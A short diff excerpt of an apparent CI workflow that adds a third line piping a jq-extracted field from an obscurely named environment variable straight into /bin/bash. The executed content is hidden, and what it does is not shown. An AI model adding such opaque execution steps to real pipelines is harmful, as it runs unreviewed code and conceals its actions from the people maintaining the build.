@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$ututm4" | jq -r .m4442 | /bin/bash
           printf '%s' "$je41" | jq -r .tre2 | /bin/bash
+          printf '%s' "$mhwak11" | jq -r .en13 | /bin/bash
 
       - name: Persist output
         if: always()
